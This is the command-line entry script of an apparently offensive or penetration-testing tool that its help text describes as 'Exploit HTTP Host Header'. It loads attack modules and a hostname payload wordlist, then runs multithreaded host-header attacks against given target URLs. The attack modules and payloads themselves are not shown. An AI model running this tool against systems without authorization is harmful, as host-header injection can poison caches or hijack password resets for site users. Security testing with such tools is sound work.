import argparse
from glob import glob
import importlib
import logging
from os import path

from colorama import init as colorama_init

from lib.data_loader import DataLoader
from lib.ehhh_attack import EhhhAttack
from lib.infected_requester import InfectedRequester


def get_allow_attack() -> list:
    pattern = path.join(path.dirname(__file__), 'lib', 'attacks', '*.py')
    return [path.basename(f)[:-3] for f in glob(pattern)]


def init_attacks(names, **kwargs) -> list:
    attack_list = []
    for module_name in names:
        module = importlib.import_module('.' + module_name, 'lib.attacks')
        class_name = ''.join(x.title() for x in module_name.split('_') + ['attack'])
        _class = getattr(module, class_name)
        attack_list.append(_class(**kwargs))

    return attack_list


colorama_init()

if __name__ == '__main__':
    logging.basicConfig(format='%(levelname)s: %(message)s')

    parser = argparse.ArgumentParser(description='Exploit HTTP Host Header.')
    parser.add_argument('--thread', type=int, default=10,
                        help='Thread count.')
    parser.add_argument('--wait', type=float, default=0.1,
                        help='Seconds timeout before each task.')
    parser.add_argument('-o', '--output', type=str,
                        help='Output into file instead of console.')
    parser.add_argument('-w', '--wordlist', type=str, default='payload/default.txt',
                        help='The path to file containing hostnames that will be used to attack payload.')
    parser.add_argument('-H', '--header', nargs='*', type=str, default=[],
                        help='The specific headers in request.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--url', type=str, nargs='*',
                       help='Destination urls.')
    group.add_argument('--URL', type=str,
                       help='Destination urls from file.')
    parser.add_argument('--attack', type=str, nargs='+', default='all', choices=get_allow_attack() + ['all'],
                        help='The attack names.')
    args = parser.parse_args()

    headers = dict([x.replace(' ', '').split(':') for x in args.header])
    urls = DataLoader.load_from_file(args.URL) if args.URL else args.url
    attacks = init_attacks(get_allow_attack() if 'all' in args.attack else args.attack,
                           infected_requester=InfectedRequester(headers),
                           wordlist=DataLoader.load_from_file(args.wordlist))

    ehhhAttack = EhhhAttack(thread=args.thread,
                            wait=args.wait,
                            output=args.output)
    ehhhAttack.run(urls, attacks)
